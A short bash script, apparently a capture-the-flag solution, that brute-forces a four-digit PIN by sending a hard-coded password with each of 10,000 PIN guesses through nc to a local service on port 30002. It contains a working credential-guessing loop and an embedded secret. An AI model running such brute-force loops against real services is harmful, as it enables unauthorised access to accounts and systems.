#!/bin/bash

pass="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

for i in {0..9999}
do
        len="${#i}"
        case $len in
                "1")
                        pin="000$i"
                        ;;
                "2")
                        pin="00$i"
                        ;;
                "3")
                        pin="0$i"
                        ;;
                "4")
                        pin="$i"
                        ;;
                *)
                        echo "u fuced up"
                        ;;
        esac

        echo -e "$pass $pin \n"
        echo -e "$pass $pin \n" | nc localhost 30002 >> file.txt

done
